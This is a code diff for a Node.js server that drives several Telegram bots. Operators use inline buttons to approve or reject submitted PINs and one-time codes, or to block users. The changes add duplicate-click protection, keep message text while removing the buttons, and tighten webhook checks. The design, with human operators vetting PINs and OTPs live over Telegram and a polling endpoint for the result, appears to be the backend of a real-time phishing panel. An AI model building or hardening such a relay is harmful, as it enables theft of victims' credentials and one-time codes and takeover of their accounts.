@@ -43,7 +43,6 @@ function loadStore() {
 
 let saveTimer = null;
 function saveStore() {
-    // Debounce writes so rapid clicks don't hammer the disk
     if (saveTimer) clearTimeout(saveTimer);
     saveTimer = setTimeout(() => {
         try {
@@ -54,23 +53,18 @@ function saveStore() {
                 blockPins,
                 requestBotMap
             }, null, 2));
-            fs.renameSync(tmp, STORE_FILE); // atomic write
+            fs.renameSync(tmp, STORE_FILE);
         } catch (err) {
             console.error('❌ Failed to save store:', err.message);
         }
     }, 200);
 }
 
-// Periodically prune old entries (older than 24h) to keep file small
 setInterval(() => {
-    // requestBotMap holds every requestId ever; keep it bounded
     const ids = Object.keys(requestBotMap);
     if (ids.length > 5000) {
         const keep = ids.slice(-2000);
-        const newMap = {};
-        const newPins = {};
-        const newCodes = {};
-        const newBlocks = {};
+        const newMap = {}, newPins = {}, newCodes = {}, newBlocks = {};
         keep.forEach(id => {
             newMap[id] = requestBotMap[id];
             if (id in approvedPins) newPins[id] = approvedPins[id];
@@ -84,9 +78,18 @@ setInterval(() => {
         saveStore();
         console.log('🧹 Pruned store to', keep.length, 'entries');
     }
-}, 60 * 60 * 1000); // hourly
+}, 60 * 60 * 1000);
 
 loadStore();
+
+// ---------------- DUPLICATE-CLICK GUARD ----------------
+const processedCallbacks = new Set();
+function isDuplicateCallback(cbId) {
+    if (processedCallbacks.has(cbId)) return true;
+    processedCallbacks.add(cbId);
+    if (processedCallbacks.size > 5000) processedCallbacks.clear();
+    return false;
+}
 
 // ---------------- MULTI-BOT STORE ----------------
 let bots = [];
@@ -135,19 +138,37 @@ async function answerCallback(bot, callbackId, text = '') {
     }
 }
 
-async function editTelegramMessage(bot, chatId, messageId, text) {
+// Removes ONLY the inline keyboard, keeps the message text as-is.
+// We pass back the original text so Telegram accepts the edit.
+async function removeInlineKeyboard(bot, chatId, messageId, originalText) {
     try {
-        await axios.post(`https://api.telegram.org/bot${bot.botToken}/editMessageText`, {
+        await axios.post(`https://api.telegram.org/bot${bot.botToken}/editMessageReplyMarkup`, {
             chat_id: chatId,
             message_id: messageId,
-            text
+            reply_markup: { inline_keyboard: [] }
         });
     } catch (err) {
-        console.error('editMessage error:', err.response?.data || err.message);
+        // Fallback: if editMessageReplyMarkup fails (rare), try editMessageText with same text
+        const desc = err.response?.data?.description || err.message;
+        if (String(desc).includes('message is not modified')) return;
+        console.error('editMessageReplyMarkup error:', desc);
+        try {
+            await axios.post(`https://api.telegram.org/bot${bot.botToken}/editMessageText`, {
+                chat_id: chatId,
+                message_id: messageId,
+                text: originalText,
+                reply_markup: { inline_keyboard: [] }
+            });
+        } catch (err2) {
+            const d2 = err2.response?.data?.description || err2.message;
+            if (!String(d2).includes('message is not modified')) {
+                console.error('editMessageText fallback error:', d2);
+            }
+        }
     }
 }
 
-// ---------------- WEBHOOK SETUP (idempotent, restart-proof) ----------------
+// ---------------- WEBHOOK SETUP (restart-proof) ----------------
 const REQUIRED_UPDATES = ['message', 'callback_query'];
 
 async function getWebhookInfo(bot) {
@@ -171,7 +192,7 @@ async function setWebhook(bot) {
             console.log(`✅ Webhook set for ${bot.botId} → ${webhookUrl}`);
             return true;
         }
-        console.error(`❌ setWebhook returned not-ok for ${bot.botId}:`, res.data);
+        console.error(`❌ setWebhook not-ok for ${bot.botId}:`, res.data);
         return false;
     } catch (err) {
         console.error(`❌ setWebhook failed for ${bot.botId}:`, err.response?.data || err.message);
@@ -180,10 +201,7 @@ async function setWebhook(bot) {
 }
 
 async function ensureWebhook(bot) {
-    // 1. Set it (always, so allowed_updates is correct)
     await setWebhook(bot);
-
-    // 2. Verify
     const info = await getWebhookInfo(bot);
     if (!info) return false;
 
@@ -191,14 +209,15 @@ async function ensureWebhook(bot) {
     const cbOk = Array.isArray(info.allowed_updates) && info.allowed_updates.includes('callback_query');
     const pending = info.pending_update_count || 0;
 
-    console.log(`🔎 ${bot.botId} webhook — url ${urlOk ? 'OK' : 'MISMATCH'}, callback_query ${cbOk ? 'OK' : 'MISSING'}, pending ${pending}`);
+    console.log(`🔎 ${bot.botId} — url ${urlOk ? 'OK' : 'MISMATCH'}, callback_query ${cbOk ? 'OK' : 'MISSING'}, pending ${pending}`);
 
     if (!urlOk || !cbOk) {
         console.warn(`⚠️ ${bot.botId} webhook check failed — retrying in 5s`);
         await new Promise(r => setTimeout(r, 5000));
         await setWebhook(bot);
         const again = await getWebhookInfo(bot);
-        const fixed = again && again.url === `${DOMAIN}/telegram-webhook/${bot.botId}`
+        const fixed = again
+            && again.url === `${DOMAIN}/telegram-webhook/${bot.botId}`
             && Array.isArray(again.allowed_updates)
             && again.allowed_updates.includes('callback_query');
         console.log(`🔁 Retry for ${bot.botId}: ${fixed ? 'FIXED' : 'STILL BROKEN'}`);
@@ -212,7 +231,6 @@ async function ensureAllWebhooks() {
     console.log('🌐 Webhook summary:', bots.map((b, i) => `${b.botId}=${results[i] ? 'OK' : 'FAIL'}`).join(', '));
 }
 
-// Re-check webhooks every 5 minutes so a silent reset (e.g. by another service) is auto-repaired
 setInterval(() => {
     ensureAllWebhooks().catch(err => console.error('Periodic webhook check error:', err.message));
 }, 5 * 60 * 1000);
@@ -288,7 +306,7 @@ app.get('/check-code/:requestId', (req, res) => {
 
 // ---------------- TELEGRAM WEBHOOK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
-    // Respond 200 IMMEDIATELY so Telegram never retries/drops
+    // Respond 200 immediately so Telegram never retries or drops updates
     res.sendStatus(200);
 
     try {
@@ -299,11 +317,18 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         }
 
         const cb = req.body.callback_query;
-        if (!cb) return; // plain message, ignore
+        if (!cb) return;
+
+        // Duplicate-click protection
+        if (isDuplicateCallback(cb.id)) {
+            console.log('🔁 Duplicate click ignored:', cb.id);
+            await answerCallback(bot, cb.id, 'Already handled');
+            return;
+        }
 
         console.log('🔘 CALLBACK:', cb.data, 'from', cb.from?.id);
 
-        // Answer FIRST — stop spinner
+        // Answer FIRST so the loading spinner stops instantly
         await answerCallback(bot, cb.id);
 
         const [action, requestId] = (cb.data || '').split(':');
@@ -312,33 +337,42 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             return;
         }
 
-        let newText = '';
+        let handled = false;
 
         if (action === 'pin_ok') {
             approvedPins[requestId] = true;
-            newText = '🔐 PIN VERIFICATION\n\n✅ PIN approved';
+            handled = true;
         } else if (action === 'pin_bad') {
             approvedPins[requestId] = false;
-            newText = '🔐 PIN VERIFICATION\n\n❌ PIN rejected';
+            handled = true;
         } else if (action === 'pin_block') {
             blockPins[requestId] = true;
-            newText = '🔐 PIN VERIFICATION\n\n🛑 User blocked';
+            handled = true;
         } else if (action === 'code_ok') {
             approvedCodes[requestId] = true;
-            newText = '🔑 OTP CODE VERIFICATION\n\n✅ Code approved';
+            handled = true;
         } else if (action === 'code_bad') {
             approvedCodes[requestId] = false;
-            newText = '🔑 OTP CODE VERIFICATION\n\n❌ Code rejected';
+            handled = true;
         } else {
             console.log('⚠️ Unknown action:', action);
             return;
         }
 
+        if (!handled) return;
+
         saveStore();
         console.log('✅', action, '→', requestId);
 
+        // Remove ONLY the buttons, keep the message text untouched
         if (cb.message) {
-            await editTelegramMessage(bot, cb.message.chat.id, cb.message.message_id, newText);
+            const originalText = cb.message.text || '';
+            await removeInlineKeyboard(
+                bot,
+                cb.message.chat.id,
+                cb.message.message_id,
+                originalText
+            );
         }
     } catch (err) {
         console.error('❌ Webhook handler error:', err.message);
